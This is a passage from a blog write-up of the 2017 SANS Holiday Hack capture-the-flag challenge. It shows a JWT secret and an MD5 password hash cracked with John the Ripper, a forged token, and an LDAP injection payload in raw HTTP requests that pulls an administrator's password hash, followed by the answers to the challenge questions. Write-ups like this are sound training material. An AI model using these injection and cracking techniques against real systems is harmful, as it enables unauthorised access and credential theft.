create our own JWT. <code>JohnTheRipper</code> can actually bruteforce it for us,
since it can bruteforce HMAC-256 secret keys. We just have to <a class="reference external" href="https://security.stackexchange.com/a/134829">make some
changes to our token</a>:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> cat alabaster_jwt.txt
<span class="go">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9#33b6782370adad6b78486c1f83b9a2e95f7fe2b6991397a156423d874e24afa2</span>
<span class="gp">$</span> john ./alabaster_jwt.txt
<span class="go">Using default input encoding: UTF-8</span>
<span class="go">Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])</span>
<span class="go">Will run 4 OpenMP threads</span>
<span class="go">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
<span class="hll"><span class="go">3lv3s            (?)</span>
</span><span class="go">1g 0:00:02:28 DONE 3/3 (2018-01-08 00:59) 0.006742g/s 2154Kp/s 2154Kc/s 2154KC/s 3k3ys..au10.</span>
<span class="go">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
<span class="go">Session completed</span>
</pre></div>
<p>Wow, it worked. I must confess that it was kind of my last hope, and I wasn't
sure it was going to work. But hey, we now have our secret key, <code>3lv3s</code>,
and we can now generate valid JWT for Alabaster. I used <a class="reference external" href="https://jwt.io/">https://jwt.io/</a> to do
so, and obtain the following token:</p>
<blockquote>
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0</blockquote>
<p>We can now log into the application:</p>
<img alt="edb_santa_panel.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_santa_panel.png" />
<p>There's a Santa panel, but we're not identified as Santa, so we can't access
it. We could try to forge a JWT for Santa, but we can see in the source code
of the application, that we actually need his password:</p>
<div class="highlight"><pre><span></span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#santa_panel&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
    <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">user_json</span><span class="p">[</span><span class="s1">&#39;dept&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;administrators&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="hll">        <span class="nx">pass</span> <span class="o">=</span> <span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;Confirm you are a Claus by confirming your password: &#39;</span><span class="p">).</span><span class="nx">trim</span><span class="p">()</span>
</span>        <span class="k">if</span> <span class="p">(</span><span class="nx">pass</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">poster</span><span class="p">(</span><span class="s2">&quot;/html&quot;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">santa_access</span><span class="o">:</span> <span class="nx">pass</span> <span class="p">},</span> <span class="nx">token</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">){</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#inneroverlay&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
                    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.overlay&#39;</span><span class="p">).</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;display&#39;</span><span class="p">,</span><span class="s1">&#39;flex&#39;</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nx">Materialize</span><span class="p">.</span><span class="nx">toast</span><span class="p">(</span><span class="s1">&#39;Incorrect Password...&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">});</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">Materialize</span><span class="p">.</span><span class="nx">toast</span><span class="p">(</span><span class="s1">&#39;You must be a Claus to access this panel!&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">});</span>
</pre></div>
<p>So, we need to find a way to get his password. Let's take a look at the
application. Apparently, we can query the application's database for elves or
reindeers matching certain names, and get some properties:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/search</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">edb.northpolechristmastown.com</span>
<span class="na">np-auth</span><span class="o">:</span> <span class="l">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com/home.html</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">SESSION=4wtVec24212atYU1RpE3</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

name=alabaster&amp;isElf=True&amp;attributes=profilePath,gn,sn,mail
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Mon, 08 Jan 2018 00:08:50 GMT</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>


[[[&quot;cn=alabaster,ou=elf,dc=northpolechristmastown,dc=com&quot;,{&quot;gn&quot;:[&quot;Alabaster&quot;],&quot;mail&quot;:[&quot;alabaster.snowball@northpolechristmastown.com&quot;],&quot;profilePath&quot;:[&quot;/img/elves/elf1.PNG&quot;],&quot;sn&quot;:[&quot;Snowball&quot;]}]]]
</pre></div>
<p>Given the result's format, we can expect the application to performan LDAP
query to retrieve the wanted attributes. If only we knew the syntax of this
query... But, wait! Let's see what we have in the application source code:</p>
<div class="highlight"><pre><span></span><span class="c1">//Note: remember to remove comments about backend query before going into north pole production network</span>
<span class="cm">/*</span>

<span class="cm">isElf = &#39;elf&#39;</span>
<span class="cm">if request.form[&#39;isElf&#39;] != &#39;True&#39;:</span>
<span class="cm">    isElf = &#39;reindeer&#39;</span>
<span class="cm">attribute_list = [x.encode(&#39;UTF8&#39;) for x in request.form[&#39;attributes&#39;].split(&#39;,&#39;)]</span>
<span class="hll"><span class="cm">result = ldap_query(&#39;(|(&amp;(gn=*&#39;+request.form[&#39;name&#39;]+&#39;*)(ou=&#39;+isElf+&#39;))(&amp;(sn=*&#39;+request.form[&#39;name&#39;]+&#39;*)(ou=&#39;+isElf+&#39;)))&#39;, attribute_list)</span>
</span>
<span class="cm">#request.form is the dictionary containing post params sent by client-side</span>
<span class="cm">#We only want to allow query elf/reindeer data</span>

<span class="cm">*/</span>
</pre></div>
<p>We have the syntax of the query. And there doesn't seem to be any filtering
on our parameters, so we can try to perform an <a class="reference external" href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">LDAP injection</a>.
I recommend you read this link, to better understand how the LDAP syntax works.</p>
<p>Now, we want to perform our injection in the <code>name</code> parameter. The goal
is to get a query that will match Santa's user entry. I ended up going with
the following payload: <code>santa*)(ou=*))(&amp;(sn=foo</code>. Indeed, the final
syntax is then:</p>
<div class="highlight"><pre><span></span>(|(&amp;(gn=*santa*)(ou=*))(&amp;(sn=foo*)(ou=elf))(&amp;(sn=*santa*)(ou=*))(&amp;(sn=foo*)(ou=elf)))
</pre></div>
<p>This query should match Santa, since we're searching for entries with names
containing <code>santa</code> in any organizational unit. Now, let's perform our
search. Since we're allowed to query any attributes we want, let's ask for the
<code>userPassword</code> attribute, found in the earlier
<code>LDIF_template.txt</code> file:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/search</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">edb.northpolechristmastown.com</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com</span>
<span class="na">np-auth</span><span class="o">:</span> <span class="l">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://edb.northpolechristmastown.com/home.html</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">SESSION=4F359T9wWTvpBczV3335</span>

<span class="hll">name=santa*)(ou=*))(%26(sn=foo&amp;isElf=True&amp;attributes=userPassword
</span></pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Mon, 08 Jan 2018 00:16:42 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">113</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="hll"><span class="p">[[[</span><span class="s2">&quot;cn=santa,ou=human,dc=northpolechristmastown,dc=com&quot;</span><span class="p">,{</span><span class="nt">&quot;userPassword&quot;</span><span class="p">:[</span><span class="s2">&quot;d8b4c05a35b0513f302a85c409b4aab3&quot;</span><span class="p">]}]]]</span>
</span></pre></div>
<p>We now have Santa's hashed password. Given the form, it seems to be an MD5
hash. Let's use <code>JohnTheRippher</code> again to try and crack it:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> cat santa_password.txt
<span class="go">d8b4c05a35b0513f302a85c409b4aab3</span>
<span class="gp">$</span> john --format<span class="o">=</span>raw-md5 --wordlist<span class="o">=</span>./rockyou.txt ./santa_password.txt
<span class="go">Using default input encoding: UTF-8</span>
<span class="go">Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])</span>
<span class="go">Warning: no OpenMP support for this hash type, consider --fork=4</span>
<span class="go">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
<span class="hll"><span class="go">001cookielips001 (?)</span>
</span><span class="go">1g 0:00:00:00 DONE (2018-01-08 01:23) 1.315g/s 18776Kp/s 18776Kc/s 18776KC/s 002007238..00196900</span>
<span class="go">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
<span class="go">Session completed</span>
</pre></div>
<p>Hurray, we have Santa's password! We can now log into the application, and
access his panel. This gives us access to this letter, sent to him:</p>
<img alt="wizard_of_oz_to_santa_d0t011d408nx.png" class="align-center" src="/images/sans-christmas-challenge-2017/wizard_of_oz_to_santa_d0t011d408nx.png" />
<p>Here's what the letter says:</p>
<blockquote>
<p>From: The Wizard of Oz</p>
<p>Emerald City, Oz</p>
<p>To: Santa Claus</p>
<p>Christmas Town, North Pole</p>
<p>Dear Santa,</p>
<p>My old friend! I wish you a very merry Christmas. Thank you for all you do
to bring holiday cheer around the world.</p>
<p>Every year, I enjoy our gift exchange -- you giving me a Christmas present
and I giving you a Solstice gift. We've exchanged some crazy things in the
past. By my reckoning, you've given me:</p>
<ul class="simple">
<li>Big Hair Hairspray</li>
<li>Pink Election Campaign Hat</li>
<li>Bacon Bandages</li>
<li>Scapy the Unicorn Plush Pillow</li>
<li>Princess Leia Earmuffs</li>
<li>Bacon Tie with Giant TV Remote</li>
<li>Stormtrooper Boxer Shorts</li>
</ul>
<p>Ah what fun times! And I've given you:</p>
<ul class="simple">
<li>The Nubulator</li>
<li>Garden Gnome</li>
<li>Justin Bieber Toothbrush</li>
<li>Snorty the Pig Hat and Pink Gloves</li>
<li>Giant Inflatable Olaf the Snowman</li>
<li>Ariana Grande Light-up Cat Ear Headphones</li>
</ul>
<p>Well, wait 'til you see what I've got for you this year, my friend! Yule
love it!</p>
<p>Merry Christmas!</p>
<p class="attribution">&mdash;The Wizard</p>
</blockquote>
<p>Well, it's nice to see that Santa gets gifts too!</p>
</div>
</div>
<div class="section" id="answers-to-the-questions">
<h2><a class="toc-backref" href="#id59">Answers to the questions</a></h2>
<p>Let's answer the questions:</p>
<ol class="arabic simple">
<li><cite>Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?</cite></li>
</ol>
<p>The title of the first page of <em>The Great Book</em> is <strong>About This Book...</strong>.</p>
<ol class="arabic simple" start="2">
<li><cite>Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?</cite></li>
</ol>
<p>The topic of the second page of <em>The Great Book</em> is the creation of flying
animals in Oz, which lead to the creation of flying reindeers.</p>
<p>Alabaster Snowball's password is <code>stream_unhappy_buy_loss</code>.</p>
<ol class="arabic simple" start="3">
<li><cite>The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?</cite></li>
</ol>
<p>The name of the share on <code>hhc17-smb-server</code> is <code>FileStor</code>.</p>
<ol class="arabic simple" start="4">
<li><cite>Elf Web Access (EWA. is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?</cite></li>
</ol>
<p>The fourth page of <em>The Great Book</em> speaks of the battles between Munchkins and
Elves, the creation of the Lollipop Guild, and their infiltration in the North
Pole population.</p>
<ol class="arabic simple" start="5">
<li><cite>How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles?  Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?</cite></li>
</ol>
<p>It takes four infractions to be marked as naughty on Santa's list.</p>
<p>Here are six insider threat moles:</p>
<ul class="simple">
<li>Boq Questrian</li>
<li>Bini Aru</li>
<li>Sheri Lewis</li>
<li>Kirsty Evans</li>
<li>Nina Fitzgerald</li>
<li>Beverly Khalil</li>
</ul>
<p>The discussion between us, Sam the Snowman, and Bumble informs us that the
person throwing giant snowballs is Bumble, the Abominable Snow Monster.</p>
<ol class="arabic simple" start="6">
<li><cite>The North Pole engineering team has introduced an Elf as a Service (EaaS.  platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?</cite></li>
</ol>
<p>The title of the first page of <em>The Great Book</em> is <strong>The Dreaded
Inter-Dimensional Tornadoes</strong>.</p>
<ol class="arabic simple" start="7">
<li><cite>Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI. to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?</cite></li>
</ol>
<p>The seventh page of <em>The Great Book</em> gives us details regarding the Witches of
Oz, their power, and their neutrality during the Great Schism.</p>
<ol class="arabic simple" start="8">
<li><cite>Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?</cite></li>
</ol>
<p>The letter was written by the Wizard of Oz, Santa's good friend.</p>
<ol class="arabic simple" start="9">
<li><cite>Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?</cite></li>
</ol>
<p>The villain causing the giant snowball problem is Glinda, the &quot;Good&quot; Witch.
She cast a spell on Bumble to make him throw giant snowballs, in order to
create an all-out war between Elves and Munchkins. This would have allowed her
to make a profit, by selling spells to both sides of the war.</p>
</div>
<div class="section" id="conclusion">
<h2><a class="toc-backref" href="#id60">Conclusion</a></h2>
<p>Once again, the SANS staff outdid themselves and gave us an amazing Christmas
challenge. I thought implementing client-side attacks, such as XSS or phishing
attacks was a nice touch. It's also great that designed the challenge to that
people would have to pivot to an internal network. Overall, it kind of reminded
me of when I took my OSCP exam/lab.</p>
<p>As usual, see you next year!</p>
<p>[EDIT 2018-03-15]</p>
<p>This write-up received an <a class="reference external" href="https://holidayhackchallenge.com/2017/winners_answers.html">honorable mention from the SANS team</a>.
Even though I didn't win any prize, I'm still super honored to receive this
recognition. Thanks to the SANS team for organizing this challenge, and
special thanks to Jerry Salinas for reviewing my write-up!</p>
</div>

  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>
</article>

    <footer>
<p>
  &copy; Yannick Méheut 2020 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
</p>
<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by-sa/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
         src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BlogPosting",
  "name": "SANS Christmas Challenge 2017",
  "headline": "SANS Christmas Challenge 2017",
  "datePublished": "2018-01-10 00:00:00+01:00",
  "dateModified": "",
  "author": {
    "@type": "Person",
    "name": "useless",
    "url": "https://allyourbase.utouch.fr/author/useless.html"
  },
  "image": "/images/useless_profile_pic.jpg",
  "url": "https://allyourbase.utouch.fr/posts/2018/01/10/sans-christmas-challenge-2017/",
  "description": "'Tis the season to be pwning, falalalala lalalala. As usual, here's my write-up for the 2017 SANS Christmas Challenge. Table of contents Introduction First page of The Great Book North Pole and Beyond: Winter Wonder Landing Cranberry Pi: Yannick's (dirty) solution Cranberry Pi: the "official" solution Redirecting the snowball Second …"
}
</script></body>
</html>